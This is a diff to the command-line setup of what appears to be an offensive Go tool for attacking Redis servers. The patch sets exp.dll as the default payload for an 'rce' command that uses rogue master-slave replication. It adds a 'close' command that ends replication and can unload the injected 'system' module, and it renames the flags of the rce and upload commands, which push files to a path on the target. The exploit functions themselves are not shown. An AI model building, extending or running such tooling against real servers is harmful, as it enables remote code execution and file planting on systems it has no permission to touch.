@@ -184,6 +184,10 @@ var rceCmd = &cobra.Command{
 			rpath = Utf8ToGbk(rpath)
 		}
 
+		if strings.EqualFold(rfile, "") {
+			rfile = "exp.dll"
+		}
+
 		RedisSlave(lhost, lport, rpath, rfile)
 		if !strings.EqualFold(command, "") {
 			RunCmd(command)
@@ -218,6 +222,20 @@ var uploadCmd = &cobra.Command{
 	},
 }
 
+var closeCmd = &cobra.Command{
+	Use:   "close",
+	Short: "关闭主从复制",
+	Long:  "",
+	Run: func(cmd *cobra.Command, args []string) {
+		err := Connect(rhost, rport, pwd)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		CloseSlave(rfile)
+	},
+}
+
 func init() {
 	rootCmd.PersistentFlags().StringVarP(&rhost, "rhost", "r", "", "目标IP")
 	rootCmd.PersistentFlags().StringVarP(&rport, "rport", "p", "6379", "目标端口")
@@ -248,22 +266,25 @@ func init() {
 
 	gopherCmd.Flags().StringVarP(&lhost, "lhost", "L", "127.0.0.1", "本地IP")
 	gopherCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
-	gopherCmd.Flags().StringVarP(&lfile, "file", "f", "", "gopher 模板文件")
+	gopherCmd.Flags().StringVarP(&lfile, "lfile", "f", "", "gopher 模板文件")
 	rootCmd.AddCommand(gopherCmd)
 
-	rceCmd.Flags().StringVarP(&lhost, "lh", "L", "", "本地IP")
-	rceCmd.Flags().StringVarP(&lport, "lp", "P", "6379", "本地端口")
-	rceCmd.Flags().StringVarP(&rpath, "rp", "d", "./", "目标路径")
-	rceCmd.Flags().StringVarP(&rfile, "rf", "f", "exp.dll", "Windows(exp.dll) Linux需要设置(exp.so)")
+	rceCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "本地IP")
+	rceCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
+	rceCmd.Flags().StringVarP(&rpath, "rpath", "d", "./", "目标路径")
+	rceCmd.Flags().StringVarP(&rfile, "rfile", "f", "exp.dll", "Windows(exp.dll) Linux需要设置(exp.so)")
 	rceCmd.Flags().StringVarP(&command, "cmd", "c", "", "单次执行主从命令")
 	rootCmd.AddCommand(rceCmd)
 
-	uploadCmd.Flags().StringVarP(&lhost, "lh", "L", "", "本地IP")
-	uploadCmd.Flags().StringVarP(&lport, "lp", "P", "6379", "本地端口")
-	uploadCmd.Flags().StringVarP(&rpath, "rp", "d", "./", "目标路径")
-	uploadCmd.Flags().StringVarP(&rfile, "rf", "f", "", "目标文件名")
-	uploadCmd.Flags().StringVarP(&lfile, "lf", "F", "", "本地文件")
+	uploadCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "本地IP")
+	uploadCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
+	uploadCmd.Flags().StringVarP(&rpath, "rpath", "d", "./", "目标路径")
+	uploadCmd.Flags().StringVarP(&rfile, "rfile", "f", "", "目标文件名")
+	uploadCmd.Flags().StringVarP(&lfile, "lfile", "F", "", "本地文件")
 	rootCmd.AddCommand(uploadCmd)
+
+	closeCmd.Flags().StringVarP(&rfile, "rfile", "f", "", "默认只关闭主从, 给个值会执行module unload system, Linux需要设置(exp.so) ")
+	rootCmd.AddCommand(closeCmd)
 }
 
 func Execute() {
